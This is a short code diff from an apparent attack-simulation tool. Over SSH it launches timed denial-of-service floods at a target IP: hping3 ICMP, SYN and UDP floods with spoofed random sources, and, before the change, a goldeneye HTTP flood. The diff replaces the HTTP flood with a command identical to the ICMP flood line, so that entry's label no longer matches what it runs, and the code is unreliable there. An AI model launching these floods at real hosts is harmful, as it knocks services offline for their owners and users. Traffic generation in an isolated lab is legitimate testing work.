@@ -613,7 +613,7 @@ class AttackSimulator:
             ssh.connect(self.host, username=self.username, password=self.password, timeout=30)
 
             attack_command = {
-                'HTTPFlood': f'timeout 45 python3 goldeneye.py http://{target_ip} -w 10',
+                'HTTPFlood': f'timeout 45 sudo hping3 -1 --flood --rand-source {target_ip}',
                 'ICMPFlood': f'timeout 45 sudo hping3 -1 --flood --rand-source {target_ip}',
                 'SYNFlood': f'timeout 45 sudo hping3 -S -p 80 --flood --rand-source {target_ip}',
                 'UDPFlood': f'timeout 45 sudo hping3 -2 --flood --rand-source -p 80 {target_ip}',
